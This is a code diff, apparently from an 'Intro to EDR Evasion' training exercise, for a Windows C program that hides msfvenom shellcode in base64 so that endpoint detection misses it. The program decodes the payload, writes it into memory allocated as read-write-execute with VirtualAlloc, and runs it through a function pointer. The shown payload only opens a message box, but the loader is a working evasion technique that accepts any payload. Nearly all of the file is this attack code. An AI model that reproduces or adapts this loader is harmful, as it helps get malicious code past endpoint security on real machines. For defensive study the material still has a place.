@@ -1,16 +1,18 @@
+/* Payload obfuscation through the use of base64 encoding */
+
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
 
-const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 /* Generated using command
 "msfvenom -p windows/x64/messagebox ICON=INFORMATION TEXT="Cybershield 2025!" TITLE="Intro to EDR Evasion" --format c" */
 
-// Base64 decoder used: https://github.com/realapire/base64-encode-decode
-
+// Base64 encoded payload
 PBYTE payload = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dPkiNjTQBAABBukx3Jgf/1UnHwUAAAAA+SI2VDgEAAD5MjYUfAQAASDHJQbpFg1YH/9VIMclBuvC1olb/1UN5YmVyc2hpZWxkIDIwMjUASW50cm8gdG8gRURSIEV2YXNpb24AdXNlcjMyLmRsbAA=";
 
+// Base64 decoder used: https://github.com/realapire/base64-encode-decode
+const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 unsigned char* base64_decode(const char* input, size_t* output_length) {
     size_t input_length = strlen(input);
     if (input_length % 4 != 0) {
@@ -72,18 +74,21 @@ unsigned char* base64_decode(const char* input, size_t* output_length) {
 
 int main(void) {
 
+    // Decode the base64 encoded payload, giving us the actual bytes that will be run
     SIZE_T decoded_payload_size;
     PBYTE decoded_payload = base64_decode(payload, &decoded_payload_size);
 
+    // Allocate memory that has read, write, and execute permission.
 	PBYTE executable_memory = VirtualAlloc(NULL, decoded_payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
 	if (executable_memory == NULL) {
 		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
 		return -1;
 	}
 
+    // Copy the encrypted payload into the allocated memory
 	memcpy(executable_memory, decoded_payload, decoded_payload_size);
 
+    // Run the payload using pointer magic
 	(*(VOID(*)()) executable_memory)();
 
 	getchar();
